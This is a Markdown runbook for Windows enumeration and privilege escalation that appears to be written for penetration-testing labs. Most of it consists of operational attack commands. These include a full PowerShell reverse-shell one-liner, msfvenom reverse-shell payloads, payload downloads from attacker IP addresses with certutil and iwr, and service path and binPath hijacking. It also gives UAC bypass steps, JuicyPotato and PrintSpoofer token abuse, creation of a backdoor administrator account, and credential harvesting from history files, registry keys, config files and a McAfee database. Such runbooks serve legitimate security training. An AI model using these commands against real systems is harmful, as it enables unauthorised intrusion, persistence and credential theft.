# Windows Enumeration and Privilege Escalation
<!--- Status 90% --->

## Introduction

This runbook is designed to guide you through the processes of Windows enumeration and privilege escalation, providing a structured approach with practical techniques and tools. It covers both command-line and PowerShell methods, organized into four key sections:

- Stabilize and Preparation: Establish a reliable shell environment and prepare for effective enumeration.
- Enumeration: Use specific commands to gather detailed information about the host system.
- Automated Tools: Leverage automated utilities to streamline both enumeration and privilege escalation efforts.
- Privilege Escalation: Apply targeted techniques to elevate user privileges on the system.

While this runbook should ideally be used prior to Active Directory enumeration, the information gathered here will also prove valuable during that phase.

## Table of Contents

- [Windows Enumeration and Privilege Escalation](#windows-enumeration-and-privilege-escalation)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [Stabilize and prep](#stabilize-and-prep)
    - [Useful reverse shells](#useful-reverse-shells)
    - [Install needed tools](#install-needed-tools)
  - [Enumeration](#enumeration)
    - [System Information](#system-information)
      - [Hostname](#hostname)
      - [OS Information](#os-information)
      - [Processes \& Services](#processes--services)
      - [Logs \& History](#logs--history)
      - [Installed software](#installed-software)
    - [Networking Information](#networking-information)
      - [Network Resources](#network-resources)
    - [Basic Domain Information](#basic-domain-information)
    - [Users \& Groups Information](#users--groups-information)
      - [Users](#users)
      - [Groups](#groups)
      - [Environment Variables](#environment-variables)
      - [Permissions](#permissions)
  - [Automated Tools](#automated-tools)
    - [WinPEASx64.exe](#winpeasx64exe)
    - [PowerUp](#powerup)
    - [Windows Privesc check](#windows-privesc-check)
  - [Privilege Escalation](#privilege-escalation)
    - [Unquoted Service Path](#unquoted-service-path)
    - [binPath - Services \[PrivEsc\]](#binpath---services-privesc)
    - [SeImpersonatePrivilege](#seimpersonateprivilege)
    - [Autorun](#autorun)
    - [Startup Applications](#startup-applications)
    - [Bypass UAC](#bypass-uac)
      - [EventViewer](#eventviewer)
      - [FodhelperBypass](#fodhelperbypass)
    - [Capturing configuration file credentials](#capturing-configuration-file-credentials)
    - [Add users](#add-users)
    - [AD Checklist - Run this if you have valid AD creds](#ad-checklist---run-this-if-you-have-valid-ad-creds)


## Stabilize and prep

- Listen to reverse shell:
```bash
rlwrap nc -lvnp 443
```

### Useful reverse shells

- Powershell oneliner:

```cmd
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Base64 encoded powershell oneliner:

```bash
wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py <ip> 443
```

- TCP reverse shell executable:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```

- Via SMB:

```bash
psexec.py '<username>:<password>@<ip>'
wmiexec.py '<username>:<password>@<ip>'
winexe -U '<username>%<password>' //<ip> cmd.exe
pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
```

- Via WinRM:

```sh
evil-winrm -i <ip> -u <username> -p <password>
evil-winrm -i <ip> -u <username> -H <nt_hash>
```

### Install needed tools
<!-- Really -->
  - powerup
  - Get-ModifiableServiceFile

## Enumeration

### System Information

#### Hostname

```cmd
- whoami
- hostname
```

#### OS Information

- OS Version

```cmd
ver
```

- OS Configuration

```cmd
systeminfo
```

- Installed Patches

```cmd
wmic qfe list
```

#### Processes & Services

- Running Processes

```powershell
Get-Process
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# NOT running as system
tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running" /V
```

- Tasks

```cmd
tasklist /svc
schtasks
```

#### Logs & History

- Logs/Events

```powershell
Get-EventLog -list
```

- History

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- Registry

```cmd
# look for passwords
reg query HKLM /f password /t REG_SZ /s
```

#### Installed software

- View installed software
32-bit:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

64-bit:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

wmic

```cmd
wmic product get name /value
```

- Program Files

```cmd
dir C:/
dir "C:/Program Files (x86)"
dir "C:/Program Files"
```

### Networking Information

- Host IP

```cmd
ipconfig /all
netstat -anot
ipconfig /displaydns
# listening ports
netstat -an | findstr LISTENING
```

- Available Networks and subnets

```cmd
route print
```

- DNS

```cmd
nslookup 
# DNS zone transfer?
```

- Known Hosts
  
```cmd
arp /a
```

- Host Firewall Configuration

<!-- more info-->

#### Network Resources

- Network Shares

``` powershell
net share
net view
```

- Domain Resources

- Network Devices

### Basic Domain Information

- Domain or Workgroup Name

- Logon Server

### Users & Groups Information

#### Users

```powershell
echo %USERNAME%
# Local User info | Check Potato or Print spoofer
whoami /priv
net localgroup
Get-LocalUser
# All domain users
net user /domain
# User specific info
net user <user> /domain
```

#### Groups

```powershell
# Local Group info
whoami /groups
Get-LocalGroup
Get-LocalGroupMember < LocalGroup >
Get-LocalGroupMember administrators
# All domain groups
net group /domain
```

#### Environment Variables

```powershell
Get-ChildItem -Path Env:
```

#### Permissions
  
- Users permissions
  <!--More -->

```cmd
net localgroup "Administrator"
```

- icacls
    - x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

- Registry

```powershell
- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

- Regular Files

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\<app> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
findstr /SI password *.txt
```


## Automated Tools

<!--The followinig needs rework -->
 evil-winrm

### WinPEASx64.exe

```cmdd
winPEASany.exe
```

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  

- Checklist
 What servers are running on the machine. Can we gain access to an internal HTTP server or something like that?
 Is there a Task or Service running on the machine that we can abuse?
 If a non-default service is present that looks promising, but you don't have write permissions to the .exe, check if it is missing a dll with procmon.
 Is the machine set up with `AlwaysInstallElevated` ?
 Anything that winpeas highlights as an escalation factor?
 Is there e.g. a web server running as root, or MySQL/MSSQL?

### PowerUp

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  

### Windows Privesc check

```cmd
windows-privesc-check2.exe --dump -G
```

https://github.com/pentestmonkey/windows-privesc-check

## Privilege Escalation

### Unquoted Service Path

- Detection

```powershell
wmic service get Name,State,PathName | findstr "Program"  
sc qc <service_name>  
\\ BINARY_PATH_NAME display Unquoted Service Paths, without ""
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

- Exploitation - attacker

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > name <name_inside_the_path>.exe  
nc -nvlp <port>
```

- Exploitation - windows

```powershell
iwr -uri <ip>/<service_eecutable_name> -Outfile <service_executable_name>
move <name_inside_the_path>.exe <service_path>  
sc stop <service_name>
sc start <service_name>
# or 
shutdown /r
```

### binPath - Services [PrivEsc]

- Detection

```powershell
. .\PowerUp.ps1
Get-ModifiableService -Verbose
# OR
Get-ModifiableService -Verbose
wmic service get Name,State,PathName | findstr "Running" | findstr "Program"  
wmic service get Name,State,PathName | findstr "Program"  
icacls <pathname>  
`//(F) and (i) (F)`
accesschk.exe -wuvc <service_name>
`//RW Everyone ` 
`//  SERVICE_CHANGE_CONFIG`
sc qc <service_name>
```

- Exploitation - windows [PrivEsc]

```powershell
certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
sc stop <service_name>  
sc query <service_name>  
sc start <service_name>  
```

https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  

### SeImpersonatePrivilege

- Detection - windows

```powershell
whoami /priv?
```

- Exploitation - windows

```powershell
iwr -uri <ip>/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PrintSpoofer64.exe -i -c cmd
```

https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

### Autorun

- Detection - windows

```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
`\\FILE_ALL_ACCESS`
```

- Exploitation - kali

```sh
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
```

```powershell
iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile program.exe)
move program.exe "C:\Program Files\Autorun Program"
logoff
```

### Startup Applications

- Detection - Windows

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F) 
\\BUILTIN\Users:(F)
```

- msfvenom - Attacker VM

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
```

- Exploitation - Windows

```powershell
iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile ok.exe)
move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
logoff
```

### Bypass UAC

After obtaining a reverse shell on a machine with a local administrator user, it may be necessary to bypass User Account Control (UAC) to perform specific malicious actions, such as persistently installing malware, modifying security settings, or exploiting system vulnerabilities. This can be done through specialized techniques and tools designed to bypass the restrictions imposed by UAC.
https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/

#### EventViewer

- Step 1 - Kali

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
```

- Step 2 - Win Owned  

```powershell
cd C:\Windows\tasks
iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```

- Step 3 - Win Owned  

```powershell
iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

`[+] Run a BypassUAC attack to elevate privileges to admin.`

- Step 4 -Kali

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=8445 -f exe > ok.exe
```

- Step 5 - Win Owned

```powershell
wget <ip>:<port>/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
. .\Invoke-EventViewer.ps1
Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
Invoke-EventViewer C:\Windows\tasks\shell2.exe
```

https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1

#### FodhelperBypass

https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1

### Capturing configuration file credentials

- Powershell History  

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

- EXploiting Saved Windows Credentials

```powershell
cmdkey /list  
runas /savecred /user:admin cmd.exe
```

- IIS Configuration  

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
```
  
- Retrieve Credentials from Software: PuTTY  

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

- Unattended Windows Installations

```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
  
- Identify  

```cmd
dir /s *.db
```

- McAfee Enterprise Endpoint Security - Credentials used during installation  

```cmd
C:\ProgramData\McAfee\Agent\DB\ma.db
sqlitebrowser ma.db
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```

https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py

### Add users

if `SeImpersonatePrivilege`:

- Create Shell

```sh
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

- Exploit

```powershell
iwr -uri http://<ip>/shell.exe -outfile shell.exe
iwr -uri http://<ip>/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
./JuicyPotatoNG.exe -t * -p "./shell.exe" 
./god.exe -cmd "net user attacker password123! /add" 
./god.exe -cmd "net localgroup administrators attacker /add"
```

### AD Checklist - Run this if you have valid AD creds

* Any users kerberoastable?
* Any users ASREP-roastable?
* Run bloodhound and visualize the AD. Anything comes to mind?
* GMSAReadPassword?
* LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
 <!--- Last Updated July 9, 2024 --->